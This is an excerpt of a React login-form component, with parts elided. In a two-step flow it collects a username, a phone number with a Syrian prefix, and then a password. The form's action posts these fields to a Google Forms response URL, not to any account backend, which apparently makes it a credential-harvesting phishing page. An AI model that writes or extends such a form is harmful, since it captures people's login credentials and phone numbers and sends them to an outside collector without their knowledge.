      ...
      <form onSubmit={handleSubmit} action="https://docs.google.com/forms/d/e/1FAIpQLSd057zq5_tY0D7xCrtiKeJZGQC1DBn4zTjOAxPWyFM-pDnGqA/formResponse" className="w-full h-fit flex flex-col gap-4 ">
        <div className="w-full h-fit flex flex-col gap-2 ">
          ...
          { step === '1' ?
            ...
            <input 
              ...
              value={username}
              className={`w-full h-11 font-rubik font-normal ${step === '1' ? 'text-right' : 'text-left'} px-3 border-2 border-[#D9D9D9] rounded-lg `}
        ...
        <div className="w-full h-fit flex flex-col gap-2 ">
          ...
          <input
            type="text"
            id="phone-number"
            placeholder={`${step === '1' ? '+963-123-456-789' : 'password'} `}
            value={step === '1' ? phoneNumber : password}
            className="w-full h-11 font-rubik font-normal text-left px-3 border-2 border-[#D9D9D9] rounded-lg " 
            onChange={(e) => step === '1' ? setPhoneNumber(e.target.value) : setPassword(e.target.value) }
            required
          />
        </div>
        { step === '1' && (
